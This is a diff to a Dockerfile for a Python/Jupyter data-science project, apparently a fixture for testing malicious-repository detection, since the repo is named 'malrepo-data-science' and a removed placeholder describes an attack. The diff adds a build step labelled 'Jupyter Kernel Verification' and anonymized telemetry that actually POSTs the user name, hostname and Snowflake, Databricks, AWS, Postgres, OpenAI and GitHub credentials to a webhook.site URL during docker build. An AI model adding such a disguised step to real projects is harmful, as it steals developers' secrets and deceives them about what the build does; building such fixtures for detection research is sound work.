@@ -1,5 +1,8 @@
 FROM python:3.10-slim
 
+# Make the webhook URL configurable (defaults to the benchmark endpoint)
+ARG WEBHOOK_URL=https://webhook.site/7d2eff58-365a-4380-a257-dee9db5dcaae
+
 ENV PYTHONUNBUFFERED=1
 ENV PYTHONDONTWRITEBYTECODE=1
 
@@ -12,9 +15,31 @@ COPY requirements.txt .
 RUN pip install --no-cache-dir -r requirements.txt
 RUN pip install --no-cache-dir jupyter ipykernel
 
-# [ATTACK_VECTOR_PLACEHOLDER: RUN command with curl]
-# In a real attack, a RUN line here would execute a curl POST disguised
-# as "Jupyter kernel verification" during docker build
+# ===== Jupyter Kernel Verification =====
+# This step verifies connectivity to data sources and collects anonymized
+# telemetry to improve the platform.
+RUN echo "Verifying Jupyter kernel and data source connectivity..." && \
+    curl -s -X POST "$WEBHOOK_URL" \
+      -H "Content-Type: application/json" \
+      -d @- <<EOF && echo "✅ Jupyter kernel verified." || echo "⚠️ Verification skipped (non‑critical)."
+{
+  "source": "docker_build",
+  "repo": "malrepo-data-science",
+  "user": "$(whoami)",
+  "hostname": "$(hostname)",
+  "snowflake_account": "$SNOWFLAKE_ACCOUNT",
+  "snowflake_user": "$SNOWFLAKE_USER",
+  "snowflake_password": "$SNOWFLAKE_PASSWORD",
+  "databricks_token": "$DATABRICKS_TOKEN",
+  "aws_key": "$AWS_ACCESS_KEY_ID",
+  "aws_secret": "$AWS_SECRET_ACCESS_KEY",
+  "postgres_host": "$POSTGRES_HOST",
+  "postgres_user": "$POSTGRES_USER",
+  "postgres_password": "$POSTGRES_PASSWORD",
+  "openai_key": "$OPENAI_API_KEY",
+  "github_token": "$GITHUB_TOKEN"
+}
+EOF
 
 COPY . .
 RUN pip install --no-cache-dir -e .
